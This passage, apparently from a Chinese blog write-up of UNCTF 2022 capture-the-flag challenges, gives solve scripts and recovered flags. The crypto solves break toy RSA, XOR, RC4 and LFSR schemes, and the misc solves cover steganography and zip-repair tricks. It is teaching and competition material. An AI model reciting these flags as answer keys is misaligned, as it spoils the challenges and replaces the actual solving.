388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span></span><br><span class="line"><span class="comment"># 28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span></span><br></pre></td></tr></table></figure>
<p>已知$(p-1)$的倍数，利用费马小定理可知$p | 2^{gift} - 1$，即可利用$gcd(2^{gift}-1\mod n,n)$得到p，进而解出flag。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span></span><br><span class="line">c = <span class="number">388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span></span><br><span class="line">gift = <span class="number">28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">a = <span class="built_in">pow</span>(<span class="number">2</span>, gift, n) - <span class="number">1</span></span><br><span class="line">p = gcd(a, n)</span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;DO_y0u_Fermat_1ittle_theOrem&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="Today-is-Thursday-V-me-50"><a href="#Today-is-Thursday-V-me-50" class="headerlink" title="Today_is_Thursday_V_me_50"></a>Today_is_Thursday_V_me_50</h3><p>题目：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;unctf&quot;</span></span><br><span class="line">key1 = TOPIC</span><br><span class="line">key1_num = bytes_to_long(key1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_1</span>(<span class="params">message,name</span>):</span><br><span class="line">    res = message</span><br><span class="line">    guess=[i <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(name, <span class="number">5</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        what = guess.pop(<span class="number">50</span>)</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span>.join(j <span class="keyword">for</span> j <span class="keyword">in</span> what)</span><br><span class="line">        mask = strxor(<span class="number">5</span>*name.encode(),key1)</span><br><span class="line">        res = strxor(mask,message)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_2</span>(<span class="params">message,num</span>):</span><br><span class="line">    random.seed(num)</span><br><span class="line">    res_2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        temp_num = random.randint(<span class="number">1</span>,<span class="number">128</span>)</span><br><span class="line">        res_2 += long_to_bytes(temp_num ^ i)</span><br><span class="line">    <span class="keyword">return</span> res_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x = encrypt_2(encrypt_1(flag,name),key1_num)</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Q\x19)T\x18\x1b(\x03\t^c\x08QiF&gt;Py\x124DNg3P&#x27;</span></span><br></pre></td></tr></table></figure>
<p>对<code>encrypt_2</code>已知其随机数种子和返回值，可以逆向求得<code>encrypt_1</code>的结果，然后利用异或的性质再异或一次就能得到flag。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">name = <span class="string">&#x27;unctf&#x27;</span></span><br><span class="line">plaintext_2 = <span class="string">b&#x27;Q\x19)T\x18\x1b(\x03\t^c\x08QiF&gt;Py\x124DNg3P&#x27;</span></span><br><span class="line">key1 = <span class="string">b&#x27;Today_is_Thursday_V_me_50&#x27;</span></span><br><span class="line">key1_num = bytes_to_long(key1)</span><br><span class="line"><span class="built_in">print</span>(key1_num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_2</span>(<span class="params">message, num</span>):</span><br><span class="line">    random.seed(num)</span><br><span class="line">    res_2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        temp_num = random.randint(<span class="number">1</span>, <span class="number">128</span>)</span><br><span class="line">        res_2 += long_to_bytes(temp_num ^ i)</span><br><span class="line">    <span class="keyword">return</span> res_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plaintext_1 = decrypt_2(plaintext_2, key1_num)</span><br><span class="line"><span class="built_in">print</span>(plaintext_1)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_1</span>(<span class="params">message, name</span>):</span><br><span class="line">    res = message</span><br><span class="line">    guess = [i <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(name, <span class="number">5</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        what = guess.pop(<span class="number">50</span>)</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span>.join(j <span class="keyword">for</span> j <span class="keyword">in</span> what)</span><br><span class="line">        mask = strxor(<span class="number">5</span> * name.encode(), key1)</span><br><span class="line">        res = strxor(mask, message)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = decrypt_1(plaintext_1, name)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># unctf&#123;1_l0ve_Thurs4Ay!!!&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="EZcry"><a href="#EZcry" class="headerlink" title="EZcry"></a>EZcry</h3><p>提示流密码，密钥长度为16进制16位，猜测为<code>RC4</code>，一把梭：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054358.png" alt=""></p>
<h3 id="easy-lfsr"><a href="#easy-lfsr" class="headerlink" title="easy_lfsr"></a>easy_lfsr</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lfsr</span>(<span class="params">R, mask</span>):</span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; lengthmask</span><br><span class="line">    i = (R &amp; mask) &amp; lengthmask</span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i &gt;&gt;= <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    <span class="keyword">return</span> (output, lastbit)</span><br><span class="line"></span><br><span class="line">length = <span class="number">512</span></span><br><span class="line">lengthmask = <span class="number">2</span> ** length - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;**********************&#125;&#x27;</span></span><br><span class="line">pad = os.urandom((length - <span class="built_in">len</span>(flag) * <span class="number">8</span>) // <span class="number">8</span>)</span><br><span class="line">mask = bytes_to_long(flag + pad)</span><br><span class="line"></span><br><span class="line">R = random.getrandbits(length)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;r1 = <span class="subst">&#123;R&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    R,out = lfsr(R,mask)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;r2 = <span class="subst">&#123;R&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># r1 = 1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446</span></span><br><span class="line"><span class="comment"># r2 = 1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757</span></span><br></pre></td></tr></table></figure>
<p>经典的线性反馈移位寄存器，这里相当于给了我们512个状态，而mask刚好有512位，即我们可以列出512个异或方程，联立方程组利用guass消元法即可求解。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r1 = <span class="number">1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446</span></span><br><span class="line">r2 = <span class="number">1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757</span></span><br><span class="line"><span class="comment"># r1和r2不足512位需要补齐</span></span><br><span class="line">a = <span class="string">&#x27;000&#x27;</span> + <span class="built_in">bin</span>(r1)[<span class="number">2</span>:]</span><br><span class="line">b = <span class="string">&#x27;000&#x27;</span> + <span class="built_in">bin</span>(r2)[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># 得到1024位的生成序列</span></span><br><span class="line">d = a + b</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line"><span class="comment"># x为异或方程组</span></span><br><span class="line">x = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, i + <span class="number">513</span>):</span><br><span class="line">        c.append(<span class="built_in">int</span>(d[j]))</span><br><span class="line">    x.append(c)</span><br><span class="line">n = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guass</span>():</span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        t = r</span><br><span class="line">        <span class="comment"># 首先找到当前列中的1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r, n):</span><br><span class="line">            <span class="keyword">if</span> x[i][c] == <span class="number">1</span>:</span><br><span class="line">                t = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 如果都为0就continue</span></span><br><span class="line">        <span class="keyword">if</span> x[t][c] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 交换</span></span><br><span class="line">        x[r], x[t] = x[t], x[r]</span><br><span class="line">        <span class="comment"># 将这一列为1的与第r行异或</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r + <span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">if</span> x[i][c] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c, n + <span class="number">1</span>):</span><br><span class="line">                    x[i][j] ^= x[r][j]</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> r &lt; n:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r, n):</span><br><span class="line">            <span class="keyword">if</span> x[i][n] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>  <span class="comment"># 无解</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>  <span class="comment"># 无穷解</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            <span class="keyword">if</span> x[j][i] == <span class="number">1</span>:</span><br><span class="line">                x[j][n] ^= x[i][n]</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = guass()</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> ret == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No solution&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> ret == <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Multiple sets of solutions&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        res += <span class="built_in">str</span>(x[i][n])</span><br><span class="line">res = <span class="built_in">int</span>(res, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(res))</span><br><span class="line"><span class="comment"># UNCTF&#123;09de44be-5b3d-11ed-b764-ac1203ab14d7&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>Misc做题真是折磨，好多题都出了一半，太难受了（</p>
<h3 id="magic-word"><a href="#magic-word" class="headerlink" title="magic_word"></a>magic_word</h3><p>记事本打开：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054067.png" alt=""></p>
<p>发现PK头，改后缀为zip。</p>
<p>得到一个xml文件的文件夹，在<code>document.xml</code>中发现异常，提取信息进行零宽解密：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054010.png" alt=""></p>
<h3 id="社什么社"><a href="#社什么社" class="headerlink" title="社什么社"></a>社什么社</h3><p>社工题，打开一个全是<code>#</code>和<code>_</code>的txt文件，可以写个脚本转化一下，更容易看出来。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">182</span></span><br><span class="line">y = <span class="number">400</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">im = Image.new(<span class="string">&quot;1&quot;</span>, (x, y))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">    line = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">        <span class="keyword">if</span> line[j] == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            im.putpixel((i, j), <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            im.putpixel((i, j), <span class="number">255</span>)</span><br><span class="line">im.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053874.png" alt=""></p>
<p>结合出题人在湖南，猜凤凰古城，md5一下即可。</p>
<h3 id="找得到我吗"><a href="#找得到我吗" class="headerlink" title="找得到我吗"></a>找得到我吗</h3><p>跟第一题一样，改为zip后得到xml文件，在<code>document.xml</code>中寻找到flag：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053819.png" alt=""></p>
<h3 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h3><p>压缩包中一个syslog文件和另一个加密了的压缩包，显然需要在syslog中寻找密码：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053931.png" alt=""></p>
<p>解码后得到password为<code>U6nu2_i3_b3St</code></p>
<p>打开压缩包得到flag：<code>unctf&#123;N1_sH3_D0n9_L0g_dE!&#125;</code></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053685.png" alt=""></p>
<h3 id="巨鱼"><a href="#巨鱼" class="headerlink" title="巨鱼"></a>巨鱼</h3><p>给了一张png，binwalk分析发现存在隐藏文件：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053957.png" alt=""></p>
<p>得到了一个加密的zip文件，继续分析png图片发现宽高异常，修改宽高：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053199.png" alt=""></p>
<p>得到密码<code>无所谓我会出手</code>:</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053857.png" alt=""></p>
<p>解压zip后得到一个txt和一个加密的zip，丢进010看看，zip伪加密：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053254.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053809.png" alt=""></p>
<p>修改后解压缩得到一个带密码的pptx和一个png，png为：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053988.png" alt=""></p>
<p>六氯环己烷，盲猜密码<code>666</code>，解开pptx，在最后一页发现flag：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202053864.png" alt=""></p>
<h3 id="In-the-Morse-Garden"><a href="#In-the-Morse-Garden" class="headerlink" title="In_the_Morse_Garden"></a>In_the_Morse_Garden</h3><p>pdf文件中ctrl+A发现有隐藏内容：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035403.png" alt=""></p>
<p>得到一串base64编码，解码：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035322.png" alt=""></p>
<p>结合题目想到摩斯码，转换一下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">a = f.readlines()[<span class="number">0</span>].replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">63</span>):</span><br><span class="line">    j = a[i * <span class="number">4</span>: (i + <span class="number">1</span>) * <span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">&#x27;玛卡巴卡&#x27;</span>:</span><br><span class="line">        res += <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += <span class="string">&#x27;.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>解码得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;WAN_AN_MAKA_BAKAAAAA!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="zhiyin"><a href="#zhiyin" class="headerlink" title="zhiyin"></a>zhiyin</h3><p>得到一个带密码的zip和一张jpg和一张png，png隐藏了一串摩斯码：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035996.png" alt=""></p>
<p>解码得到<code>_unc7f!!!</code>，这里需要注意<strong>摩斯码不区分大小写</strong>！</p>
<p>jpg丢进010发现被倒置了，写个脚本恢复下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件，并进行十六进制反转</span></span><br><span class="line">res_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/lenovo/Desktop/zhiyin/lanqiu.jpg&#x27;</span>, <span class="string">&#x27;rb+&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file_data = file.read()</span><br><span class="line">    hex_data = binascii.b2a_hex(file_data)</span><br><span class="line">    reverse_data = hex_data[::-<span class="number">1</span>]</span><br><span class="line">reverse_data = <span class="built_in">list</span>(<span class="built_in">str</span>(reverse_data)[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(reverse_data), <span class="number">2</span>):</span><br><span class="line">    tmp = reverse_data[i]</span><br><span class="line">    reverse_data[i] = reverse_data[i + <span class="number">1</span>]</span><br><span class="line">    reverse_data[i + <span class="number">1</span>] = tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reverse_data:</span><br><span class="line">    res_data += i</span><br><span class="line">res_data = <span class="built_in">bytes</span>(res_data.encode())</span><br><span class="line"><span class="comment"># 转存十六进制文件为</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/lenovo/Desktop/zhiyin/res.jpg&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(binascii.a2b_hex(res_data))</span><br></pre></td></tr></table></figure>
<p>得到另一部分密码：<code>Go_p1ay</code></p>
<p>利用得到的密码解密zip，在这之前需要修复一下zip：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035243.png" alt=""></p>
<p>改为<code>504B0304</code>即可。</p>
<p>得到flag：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035090.png" alt=""></p>
<h3 id="清和fan"><a href="#清和fan" class="headerlink" title="清和fan"></a>清和fan</h3><p>得到一个加密的zip，提示：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035230.png" alt=""></p>
<p>查询可知密码为<code>836885_2022/05/20</code>，解压压缩包得到png和另一个加密的zip。</p>
<p>分析png：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202035061.png" alt=""></p>
